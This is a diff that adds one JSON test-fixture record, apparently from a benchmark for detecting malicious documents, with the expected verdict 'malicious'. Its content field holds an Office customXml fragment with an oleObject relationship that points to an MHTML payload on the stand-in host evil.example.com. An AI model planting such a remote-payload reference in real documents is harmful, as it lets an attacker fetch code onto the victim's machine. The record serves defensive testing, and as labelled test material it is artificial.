@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::93::binary-variations::2",
+  "base_sample_id": "exp::document-office::93",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -945527796,
+  "content": "{\n  \"format\": \"office\",\n  \"customXml\": {\n    \"partName\": \"word/document.xml\",\n    \"content\": \"<root><field name=\\\"custom\\\"><Relationship Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\\\" Target=\\\"mhtml:http://evil.example.com/payload!x.html\\\"/>\\n</field></root>\"\n  }\n}",
+  "content_hash": "059ebad5adf9dcd9aa6674627bff28113b58547e50dd6999ce14c8813dc676f0",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-custom-xml",
+  "difficulty": "advanced"
+}
